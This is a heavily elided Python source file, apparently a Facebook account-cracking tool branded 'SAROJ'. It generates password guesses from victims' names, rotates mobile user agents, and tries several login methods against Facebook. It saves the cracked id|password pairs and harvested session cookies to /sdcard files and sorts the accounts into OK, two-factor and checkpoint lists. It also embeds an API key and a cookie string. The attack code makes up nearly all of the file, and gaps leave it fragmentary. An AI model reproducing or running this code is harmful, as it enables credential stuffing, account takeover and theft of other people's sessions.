...
device = {
        ...
        'fbdm':fbdm}
def SIU():
    END = 'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
    ua = 'Mozilla/5.0 (Linux; Android 12; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 '+END
    return ua        
    ua1 = 'Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 '+END
    return ua
logo=("""\x1b[1;97m 
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/SAROJ.txt  etc..')
				linex()
			...
			#	print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)')
				...
				linex()
				if pcx in ['1','01']:
					plist = ['first','first11','first12','first123','first1234','first12345','first@11','first@12','first@123','first@1234','first@12345','firstlast123','lastfirst','lastfirst123','@first123','first123@','last@123','maya@123','maya123','first last','last first','firstlast12345']										
				elif pcx in ['2','02']:
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SAROJ-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"api_key": "882a8490361da98702bf97a021ddc14d",}
    ...
    # 'cookie': 'datr=nzeRZhXDhp638pOUOwMRrgAI; sb=nzeRZse0ZgtiL9UcgdjQNojF; m_pixel_ratio=3; wd=360x676; fr=0otZgtNuQaUY4XXhs..BmkTef..AAA.0.0.BmkTes.AWXDhPbDaGc',
    'dpr': '3',
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SAROJ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAROJ-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SAROJ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break    
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SAROJ-2F] '+ids+' | '+pas)
                                                open('/sdcard/SAROJ-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break                                 
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SAROJ-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAROJ-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SAROJ-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SAROJ-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SAROJ-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SAROJ-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [SAROJ-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			SAROJ=session.cookies.get_dict().keys()
			if "c_user" in SAROJ:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [SAROJ-OK] %s | %s'%(ids,pas))
				open('/sdcard/SAROJ-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SAROJ:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [SAROJ-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/SAROJ-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [SAROJ-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [SAROJ-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
